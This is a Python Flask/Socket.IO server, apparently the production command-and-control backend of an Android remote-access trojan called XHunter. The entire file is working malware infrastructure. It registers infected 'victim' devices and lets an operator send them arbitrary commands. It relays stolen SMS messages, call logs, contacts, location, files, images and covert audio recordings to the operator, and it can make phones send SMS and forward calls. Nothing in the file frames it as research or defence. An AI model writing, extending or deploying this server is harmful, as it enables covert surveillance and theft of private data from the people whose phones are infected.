#!/usr/bin/env python3
"""
XHunter Backend Server - Production Ready
Deploy: Render, Heroku, Railway, Koyeb
Port: 10000 (Render default)
"""

import eventlet
eventlet.monkey_patch()

from flask import Flask, request as flask_request, jsonify
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import json
import os
from datetime import datetime

# ==================== CONFIG ====================
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'xhunter-prod-secret-2024')
CORS(app, resources={r"/*": {"origins": "*"}})

socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode='eventlet',
    ping_timeout=60,
    ping_interval=25,
    max_http_buffer_size=100 * 1024 * 1024,
    transports=['websocket', 'polling'],
    allow_upgrades=True,
    upgrade_timeout=10000,
    logger=False,
    engineio_logger=False
)

PORT = int(os.environ.get('PORT', 10000))

# ==================== DATA STORE ====================
victimList = {}
victimData = {}
adminSocketId = None

# ==================== ROUTES ====================

@app.route('/')
def index():
    return jsonify({
        'server': 'XHunter Backend',
        'version': '2.0.0',
        'status': 'online',
        'devices_connected': len(victimList),
        'admin_connected': adminSocketId is not None,
        'uptime': str(datetime.now()),
        'endpoints': {
            'health': '/health',
            'devices': '/api/devices',
            'socketio': 'wss://' + flask_request.host + '/socket.io/'
        }
    })

@app.route('/health')
def health():
    return jsonify({
        'status': 'ok',
        'devices': len(victimList),
        'admin': adminSocketId is not None
    })

@app.route('/api/devices')
def api_devices():
    devices = []
    for dev_id, data in victimData.items():
        devices.append({
            'id': dev_id,
            'model': data.get('model', 'Unknown'),
            'android': data.get('android', 'Unknown'),
            'battery': data.get('battery', 0),
            'sim': data.get('sim', 'Unknown'),
            'manufacture': data.get('manufacture', 'Unknown'),
            'online': True,
            'connected_at': data.get('connectedAt', '')
        })
    return jsonify({
        'success': True,
        'count': len(devices),
        'devices': devices
    })

# ==================== SOCKET.IO EVENTS ====================

@socketio.on('connect')
def on_connect(auth=None):
    sid = flask_request.sid
    print(f"[CONNECT] {sid}")

@socketio.on('disconnect')
def on_disconnect(reason=None):
    global adminSocketId
    sid = flask_request.sid
    print(f"[DISCONNECT] {sid} | Reason: {reason}")

    if sid == adminSocketId:
        adminSocketId = None
        print("[ADMIN] Left")
        return

    for dev_id, sock_id in list(victimList.items()):
        if sock_id == sid:
            del victimList[dev_id]
            victimData.pop(dev_id, None)
            if adminSocketId:
                socketio.emit('disconnectClient', dev_id, to=adminSocketId)
            print(f"[DEVICE] {dev_id} disconnected")
            break

@socketio.on('adminJoin')
def on_admin_join():
    global adminSocketId
    adminSocketId = flask_request.sid
    print(f"[ADMIN] {adminSocketId}")

    for dev_id, data in list(victimData.items()):
        socketio.emit('join', data, to=adminSocketId)

    socketio.emit('adminConnected', {
        'victimCount': len(victimList)
    }, to=adminSocketId)

@socketio.on('join')
def on_device_join(data):
    sid = flask_request.sid
    dev_id = data.get('id', sid)

    victimList[dev_id] = sid
    victimData[dev_id] = {
        'id': dev_id,
        'model': data.get('model', 'Unknown'),
        'android': data.get('android', 'Unknown'),
        'battery': data.get('battery', 0),
        'sim': data.get('sim', 'Unknown'),
        'manufacture': data.get('manufacture', 'Unknown'),
        'appInstallTime': data.get('appInstallTime', ''),
        'freeDiskStorage': data.get('freeDiskStorage', 0),
        'totalDiskCapacity': data.get('totalDiskCapacity', 0),
        'socketId': sid,
        'online': True,
        'connectedAt': datetime.now().isoformat()
    }

    print(f"[DEVICE] {dev_id} | {data.get('model', '?')} | Android {data.get('android', '?')}")

    if adminSocketId:
        socketio.emit('join', victimData[dev_id], to=adminSocketId)

    socketio.emit('deviceRegistered', {
        'success': True,
        'deviceId': dev_id
    }, to=sid)

@socketio.on('request')
def on_request(data):
    try:
        req = json.loads(data) if isinstance(data, str) else data
        to = req.get('to', '')
        action = req.get('action', '')
        payload = req.get('data', {})

        if to not in victimList:
            if adminSocketId:
                socketio.emit('error', {'error': 'Device offline'}, to=adminSocketId)
            return

        payload_str = json.dumps(payload) if isinstance(payload, dict) else str(payload)
        socketio.emit(action, payload_str, to=victimList[to])

    except Exception as e:
        print(f"[ERROR] request: {e}")

# ==================== RELAY HANDLERS ====================

def relay(event, data):
    if adminSocketId:
        socketio.emit(event, data, to=adminSocketId)

@socketio.on('getDir')
def r_getDir(data): relay('getDir', data)

@socketio.on('getSMS')
def r_getSMS(data): relay('getSMS', data)

@socketio.on('getCallLog')
def r_getCallLog(data): relay('getCallLog', data)

@socketio.on('getContacts')
def r_getContacts(data): relay('getContacts', data)

@socketio.on('getInstalledApps')
def r_getApps(data): relay('getInstalledApps', data)

@socketio.on('getLocation')
def r_getLocation(data): relay('getLocation', data)

@socketio.on('sendSMS')
def r_sendSMS(data): relay('sendSMS', data)

@socketio.on('download')
def r_download(data): relay('download', data)

@socketio.on('previewImage')
def r_preview(data): relay('previewImage', data)

@socketio.on('callForwardResult')
def r_callForward(data): relay('callForwardResult', data)

@socketio.on('audioRecording')
def r_audioRecording(data): relay('audioRecording', data)

@socketio.on('audioRecordingStatus')
def r_audioStatus(data): relay('audioRecordingStatus', data)

@socketio.on('vibrateResult')
def r_vibrate(data): relay('vibrateResult', data)

@socketio.on('torchResult')
def r_torch(data): relay('torchResult', data)

@socketio.on('error')
def r_error(data): relay('error', data)

@socketio.on('ping')
def on_ping(data=None):
    emit('pong', {'time': datetime.now().isoformat()})

# ==================== MAIN ====================

if __name__ == '__main__':
    print(f"""
    ╔══════════════════════════════════╗
    ║   XHunter Backend v2.0         ║
    ║   Port: {PORT}                    ║
    ║   Production Ready             ║
    ╚══════════════════════════════════╝
    """)
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False, use_reloader=False)